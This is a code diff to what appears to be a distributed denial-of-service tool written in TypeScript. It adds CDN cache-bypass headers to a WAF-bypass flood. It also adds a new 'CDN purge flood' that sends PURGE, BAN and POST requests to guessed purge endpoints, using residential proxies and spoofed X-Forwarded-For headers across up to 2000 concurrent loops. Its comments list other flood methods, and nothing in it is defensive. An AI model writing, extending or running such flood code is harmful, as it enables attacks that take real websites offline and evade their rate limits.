@@ -2869,10 +2869,18 @@ async function runWAFBypass(
         }
         fetchHdrs["accept-language"]   = VARY_LANGS[randInt(0, VARY_LANGS.length)];
         fetchHdrs["accept-encoding"]   = VARY_ENCODINGS[randInt(0, VARY_ENCODINGS.length)];
-        fetchHdrs["cache-control"]     = "no-cache, no-store, must-revalidate, max-age=0";
-        fetchHdrs["pragma"]            = "no-cache";
-        fetchHdrs["if-none-match"]     = `"${randHex(32)}"`;
-        fetchHdrs["if-modified-since"] = new Date(Date.now() - randInt(1, 86400) * 1000).toUTCString();
+        fetchHdrs["cache-control"]       = "no-cache, no-store, must-revalidate, max-age=0";
+        fetchHdrs["pragma"]              = "no-cache";
+        fetchHdrs["if-none-match"]       = `"${randHex(32)}"`;
+        fetchHdrs["if-modified-since"]   = new Date(Date.now() - randInt(1, 86400) * 1000).toUTCString();
+        // GoCache + generic CDN bypass headers — tells every edge layer not to serve from cache
+        fetchHdrs["surrogate-control"]   = "no-store";
+        fetchHdrs["edge-control"]        = "no-store, max-age=0";
+        fetchHdrs["x-gocache-bypass"]    = "1";
+        fetchHdrs["x-cache-bypass"]      = "1";
+        fetchHdrs["x-bypass-cache"]      = "1";
+        fetchHdrs["vary"]                = "*";
+        fetchHdrs["x-forwarded-noCache"] = "true";
         const isPost = Math.random() < 0.40;
         const res    = await fetch(`https://${hostname}${fullPath}`, {
           method:  isPost ? "POST" : "GET",
@@ -6280,6 +6288,108 @@ async function runCacheBuster(
 //  All 4 vectors fire concurrently. Each request gets a unique cache-busting key so
 //  Vercel's CDN edge passes 100% of requests to the serverless runtime.
 // ═══════════════════════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+//  CDN PURGE FLOOD — GoCache + generic CDN cache invalidation
+//
+//  Strategy:
+//  1. POST to known GoCache purge endpoints (/cdn-cgi/purge, /cdn-cgi/cache-purge)
+//     with a JSON body listing unique URL variants — each purge call causes GoCache
+//     to forward the next request to the origin (cache miss).
+//  2. Use PURGE/BAN HTTP methods — honored by GoCache, Varnish, Nginx proxy_cache.
+//  3. Rotate through 8 purge paths × 4 HTTP methods = 32 endpoint combinations.
+//  4. Each request carries GoCache-specific bypass headers to prevent the edge from
+//     serving a cached response to the purge call itself.
+//  5. 90% via residential proxies — different source IP per purge → CDN cannot
+//     rate-limit by IP without blocking legitimate cache management.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runCDNPurgeFlood(
+  base:    string,
+  threads: number,
+  proxies: ProxyConfig[],
+  signal:  AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const u = (() => {
+    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
+    catch { return new URL("https://127.0.0.1"); }
+  })();
+  const hostname = u.hostname;
+
+  const PURGE_PATHS   = [
+    "/cdn-cgi/purge", "/cdn-cgi/cache-purge", "/__purgecache",
+    "/purge", "/api/purge", "/cdn/purge", "/__purge", "/purge-cache",
+  ];
+  const PURGE_METHODS = ["POST", "POST", "POST", "PURGE", "BAN", "DELETE", "POST", "POST"]; // weight POST
+  const CDN_BYPASS_HEADERS: Record<string, string> = {
+    "X-GoCache-Bypass":    "1",
+    "X-Cache-Bypass":      "1",
+    "X-Bypass-Cache":      "1",
+    "Surrogate-Control":   "no-store",
+    "Edge-Control":        "no-store, max-age=0",
+    "Cache-Control":       "no-cache, no-store, must-revalidate, max-age=0",
+    "Pragma":              "no-cache",
+    "Vary":                "*",
+    "X-Forwarded-NoCache": "true",
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flushIv = setInterval(() => {
+    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
+  }, 300);
+
+  const buildPurgeBody = () => JSON.stringify({
+    urls: Array.from({ length: randInt(5, 15) }, () => `https://${hostname}/${randStr(8)}?v=${randStr(4)}`),
+    tag:  randStr(8),
+    key:  randStr(12),
+    _t:   Date.now(),
+    _r:   randStr(6),
+  });
+
+  const buildPurgeReqHeaders = (body: string): Record<string, string> => ({
+    "Host":           hostname,
+    "User-Agent":     randUA(),
+    "Content-Type":   "application/json",
+    "Content-Length": String(Buffer.byteLength(body)),
+    "Accept":         "application/json, */*",
+    "X-Forwarded-For":randIp(),
+    ...CDN_BYPASS_HEADERS,
+  });
+
+  const doRequest = async (): Promise<void> => {
+    const path   = PURGE_PATHS[randInt(0, PURGE_PATHS.length)];
+    const method = PURGE_METHODS[randInt(0, PURGE_METHODS.length)];
+    const body   = buildPurgeBody();
+    const hdrs   = buildPurgeReqHeaders(body);
+    const url    = `https://${hostname}${path}`;
+
+    try {
+      if (proxies.length > 0 && Math.random() < 0.90) {
+        const proxy = pickProxy(proxies);
+        const bytes = await fetchViaProxy(url, proxy, method, hdrs, body)
+          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
+          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return body.length; });
+        localPkts++; localBytes += bytes;
+      } else {
+        const ac = new AbortController();
+        const timer = setTimeout(() => ac.abort(), 6_000);
+        const res = await fetch(url, {
+          method, headers: hdrs,
+          body: ["GET", "HEAD"].includes(method) ? undefined : body,
+          signal: ac.signal,
+        }).catch(() => null);
+        clearTimeout(timer);
+        await res?.body?.cancel();
+        localPkts++; localBytes += body.length + 300;
+      }
+    } catch { /* absorb — server may reject unknown purge paths, that's expected */ }
+  };
+
+  const NUM_SLOTS = IS_PROD ? Math.min(Math.max(100, threads * 4), 2000) : Math.max(20, threads);
+  const runSlot = async () => { while (!signal.aborted) { await doRequest(); } };
+  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
+  clearInterval(flushIv);
+}
+
 async function runVercelFlood(
   base:    string,
   threads: number,
@@ -7740,6 +7850,11 @@ async function runWorker() {
   } else if (cfg.method === "doh-flood") {
     // DNS over HTTPS Flood — random queries to /dns-query, forces recursive DNS resolver lookup
     await runDoHFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+
+  } else if (cfg.method === "cdn-purge-flood") {
+    // CDN Purge Flood — POST/PURGE/BAN to GoCache+generic purge endpoints via proxies
+    // Forces cache invalidation → every subsequent request hits the origin, bypassing CDN cache
+    await runCDNPurgeFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "keepalive-exhaust") {
     // Keepalive Exhaust — pipeline 256 requests per keep-alive connection, holds worker threads
